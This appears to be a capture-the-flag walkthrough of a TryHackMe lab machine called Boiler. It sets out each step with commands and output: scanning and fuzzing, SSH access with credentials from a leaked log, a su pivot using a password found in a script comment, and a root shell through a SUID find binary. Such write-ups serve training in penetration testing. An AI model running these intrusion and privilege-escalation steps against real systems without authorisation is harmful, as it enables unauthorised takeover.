#  Boiler CTF: Complete Machine Walkthrough

## 🛠️ Phase 1: External Reconnaissance & Port Scanning

The engagement began with a raw target IP address (`10.49.180.124`). The absolute first step in any penetration test is to map out the active attack surface. To do this, a comprehensive infrastructure scan was conducted using **`nmap`** to identify all open TCP ports, running services, and operating system versions:

Bash

```
nmap -p- -T4 -A 10.49.180.124
```

### The Port Profile Results

|**Port**|**Protocol**|**Service**|**Strategic Purpose**|
|---|---|---|---|
|**21**|TCP|FTP|Checked for anonymous access or file exposure configurations.|
|**22**|TCP|SSH|Default secure shell administration port.|
|**80**|TCP|HTTP|Apache web server hosting the primary web application.|
|**10000**|TCP|Webmin|Web-based system administration interface.|
|**55007**|TCP|SSH|An obfuscated, high-port secondary SSH daemon.|

## 📂 Phase 2: Web Layer Directory Fuzzing

With Port 80 verified open, a quick review of the landing page showed a base application installation. To hunt for unindexed development environments, backup folders, or hidden subdirectories, the directory fuzzer **`ffuf`** was launched using the standard `dirb/common.txt` wordlist:

Bash

```
ffuf -u http://10.49.180.124/joomla/FUZZ -w /usr/share/wordlists/dirb/common.txt
```

### The Staging Leak

The fuzzer successfully pinpointed a hidden development path that was completely unlinked on the main application interface:

- `http://10.49.180.124/joomla/_test/`
    

Investigating further inside that `/_test/` directory uncovered an unredacted text file left behind by the development team:

- **`log.txt`**
    

Using `curl` to pull the file contents (`curl http://10.49.180.124/joomla/_test/log.txt`), a breakdown of development staging logs was exposed. Deep inside these text notes, the administrator had accidentally leaked critical architectural secrets:

1. Confirmation that the active SSH management daemon was bound to the high port: **`55007`**.
    
2. A raw, plaintext set of credentials for an unprivileged local system user: **`basterd`**.
    

## 🚪 Phase 3: Establishing the Foothold

Equipped with the high-port SSH destination and the credentials harvested directly from the web server's log leak, the web attack path was closed out. A direct network terminal connection was initiated from the Kali machine:

Bash

```
ssh basterd@10.49.180.124 -p 55007
```

Upon submitting the leaked password, the remote Ubuntu server authenticated the session and dropped the terminal into a low-privilege system workspace:

Plaintext

```
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.4.0-142-generic i686)
$ 
```

## 🔍 Phase 4: Local Enumeration & Horizontal User Pivot

Once the initial landing shell was established as `basterd`, immediate local audits were run to determine security constraints and system boundaries:

Bash

```
$ id
uid=1001(basterd) gid=1001(basterd) groups=1001(basterd)

$ sudo -l
Sorry, user basterd may not run sudo on Vulnerable.
```

With `sudo` access completely denied, a manual inventory of files inside the starting workspace was conducted. This quickly flagged an anomalous script configuration file:

Bash

```
$ ls -la
total 16
-r--r--r-- 1 stoner  basterd  699 Aug 21  2019 backup.sh
```

### Extracting the Script Secret

The file permissions revealed that while `backup.sh` was owned by a separate system user profile named **`stoner`**, its group permissions were assigned to `basterd`, giving the landing account full read access.

Inspecting the underlying shell script code using `cat` exposed a significant oversight:

Bash

```
$ cat backup.sh
REMOTE=1.2.3.4
SOURCE=/home/stoner
TARGET=/usr/local/backup
LOG=/home/stoner/bck.log
USER=stoner
#superduperp@$$no1knows
...
```

The script author documented an active password directly within a cleartext code comment: **`superduperp@$$no1knows`**.

### Executing the Pivot (`basterd` ➔ `stoner`)

Assuming common local credential reuse across accounts, the native Unix **`su` (Substitute User)** binary was used to attempt a horizontal switch into `stoner`'s terminal context:

Bash

```
$ su stoner
Password: superduperp@$$no1knows
```

The system validated the token, instantly escalating our lateral workspace profile:

Plaintext

```
stoner@Vulnerable:/tmp$
```

## 👑 Phase 5: Local Privilege Escalation to Root

Now operating as `stoner`, a comprehensive privilege check was performed. While automated scripts like `linpeas.sh` identified standard architectural layout details, a targeted manual scan was executed to find any binaries carrying the **SUID (Set User ID)** permission flag:

Bash

```
find / -perm -4000 -type f 2>/dev/null
```

Out of the typical system utilities that populated the list, a massive binary misconfiguration stood out clearly:

- **`/usr/bin/find`**
    

An `ls -l` command verified its raw operational file status:

Bash

```
ls -l /usr/bin/find
-rwsr-xr-x 1 root root 238716 Aug 22  2019 /usr/bin/find
```

### The Vulnerability Explained

The presence of the lowercase **`s`** flag inside the owner execution field (`-rws`) explicitly confirmed that the SUID bit was active. Because the file's owner is **`root`**, the Linux kernel is forced to run this specific `find` process with total root administrative permissions, completely ignoring the lower privileges of the user executing it.

### Spawning the Administrative Root Shell

The `find` utility includes a native, built-in feature called the **`-exec` flag**, built to let users run system commands on files it discovers. Because the parent `find` application runs as root due to the SUID bit, any sub-shell triggered inside that parameter automatically inherits root authority.

To drop into a root shell, `find` was commanded to check the current folder (`.`), launch an interactive shell binary (`/bin/sh`), and pass the privilege preservation flag (`-p`) to stop the underlying OS from stripping away the inherited administrative security token:

Bash

```
find . -exec /bin/sh -p \; -quit
```

The terminal prompt swapped over immediately, confirming absolute, uninhibited root control over the machine:

Plaintext

```
# id
uid=1002(stoner) gid=1002(stoner) euid=0(root) groups=1002(stoner)
# 
```

The presence of `euid=0(root)` verified complete system takeover.

## 🏁 Phase 6: Flag Recovery

With absolute read/write authority verified across the entire operating system, final flag collection was immediate.

### Locating the User Flag

From the root shell prompt, a targeted file search was executed to find the location of the user flag asset:

Bash

```
find / -name "user.txt" 2>/dev/null
```

The command pointed straight to the active user home profiles, allowing immediate extraction:

Bash

```
cat /home/stoner/user.txt
```

### Locating the Root Flag

Finally, a quick transition into the root user's private folder isolated the ultimate objective flag:

Bash

```
cat /root/root.txt
```

**Booommm!** Machine successfully completed from initial network scanning to total root privilege extraction.

🧑‍💻 https://tryhackme.com/p/4thul.exe